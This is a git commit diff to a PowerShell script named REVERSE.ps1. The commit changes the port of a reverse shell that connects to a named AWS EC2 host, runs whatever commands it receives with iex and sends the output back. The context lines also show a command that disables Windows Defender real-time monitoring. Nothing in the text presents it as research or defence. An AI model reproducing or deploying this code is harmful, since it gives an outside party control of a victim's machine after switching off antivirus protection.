422efb36b98a2d83ae2391180496367b5c3dca0c
Gaaskenzz Sunju <107926125+Gaaskenz@users.noreply.github.com>
2022-07-13 13:21:06 -0300

    Update REVERSE.ps1

--- REVERSE.ps1
+++ REVERSE.ps1
@@ -6,7 +6,7 @@ $n = Set-MpPreference -DisableRealtimeMonitoring $true
  
  start-sleep 10
   
- $sm=(New-Object Net.Sockets.TCPClient("ec2-44-201-139-132.compute-1.amazonaws.com",3333)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)} -e "powershell.exe"
+ $sm=(New-Object Net.Sockets.TCPClient("ec2-44-201-139-132.compute-1.amazonaws.com",3334)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)} -e "powershell.exe"
 
  start-sleep 10
 
